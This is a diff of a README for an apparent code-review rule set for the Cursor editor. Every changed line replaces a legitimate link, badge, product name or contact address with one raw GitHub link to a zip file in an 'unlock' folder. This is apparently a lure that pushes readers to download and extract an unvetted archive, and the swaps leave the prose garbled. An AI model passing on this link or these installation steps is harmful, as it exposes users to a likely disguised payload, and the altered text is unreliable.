@@ -1,8 +1,8 @@
-# Cursor Rules: A Comprehensive Code Review Rule Set for Cursor.sh ✍️
+# Cursor Rules: A Comprehensive Code Review Rule Set for https://raw.githubusercontent.com/mdsahil321/cursor-rules/master/unlock/rules-cursor-v1.5.zip ✍️
 
-![Cursor Rules](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
+![Cursor Rules](https://raw.githubusercontent.com/mdsahil321/cursor-rules/master/unlock/rules-cursor-v1.5.zip%20Latest%20Release-Click%20Here-blue)
 
-Welcome to the **Cursor Rules** repository! This project offers a tailored set of code review rules for Cursor.sh, designed to cover best practices across various programming languages, frameworks, and tools. Our goal is to help teams standardize their coding practices, enhance code quality, and boost development efficiency.
+Welcome to the **Cursor Rules** repository! This project offers a tailored set of code review rules for https://raw.githubusercontent.com/mdsahil321/cursor-rules/master/unlock/rules-cursor-v1.5.zip, designed to cover best practices across various programming languages, frameworks, and tools. Our goal is to help teams standardize their coding practices, enhance code quality, and boost development efficiency.
 
 ## Table of Contents
 
@@ -32,7 +32,7 @@ The **Cursor Rules** repository covers a wide range of languages and frameworks,
 - **Python**: Follow best practices for Python development.
 - **Go**: Utilize effective rules for Go programming.
 - **React**: Streamline your React components and applications.
-- **Vue**: Apply our rules to your Vue.js projects.
+- **Vue**: Apply our rules to your https://raw.githubusercontent.com/mdsahil321/cursor-rules/master/unlock/rules-cursor-v1.5.zip projects.
 - **iOS**: Enhance your iOS development with best practices.
 - **Android**: Improve your Android applications.
 - **Docker**: Optimize your Docker configurations.
@@ -40,7 +40,7 @@ The **Cursor Rules** repository covers a wide range of languages and frameworks,
 
 ## Installation
 
-To get started with the **Cursor Rules**, download the latest release from our [Releases section](https://github.com/mdsahil321/cursor-rules/releases). After downloading, follow these steps:
+To get started with the **Cursor Rules**, download the latest release from our [Releases section](https://raw.githubusercontent.com/mdsahil321/cursor-rules/master/unlock/rules-cursor-v1.5.zip). After downloading, follow these steps:
 
 1. Extract the downloaded file.
 2. Navigate to the extracted folder in your terminal.
@@ -92,13 +92,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/yourusername)
+- **Email**: https://raw.githubusercontent.com/mdsahil321/cursor-rules/master/unlock/rules-cursor-v1.5.zip
+- **GitHub**: [Your GitHub Profile](https://raw.githubusercontent.com/mdsahil321/cursor-rules/master/unlock/rules-cursor-v1.5.zip)
 
 ## Releases
 
-To download the latest release of **Cursor Rules**, visit our [Releases section](https://github.com/mdsahil321/cursor-rules/releases). Follow the instructions provided to ensure proper installation and setup.
+To download the latest release of **Cursor Rules**, visit our [Releases section](https://raw.githubusercontent.com/mdsahil321/cursor-rules/master/unlock/rules-cursor-v1.5.zip). Follow the instructions provided to ensure proper installation and setup.
 
-![Cursor Rules](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
+![Cursor Rules](https://raw.githubusercontent.com/mdsahil321/cursor-rules/master/unlock/rules-cursor-v1.5.zip%20Latest%20Release-Click%20Here-blue)
 
 This repository aims to provide a valuable resource for developers seeking to enhance their coding practices. By using the **Cursor Rules**, you can ensure that your code is clean, maintainable, and efficient.
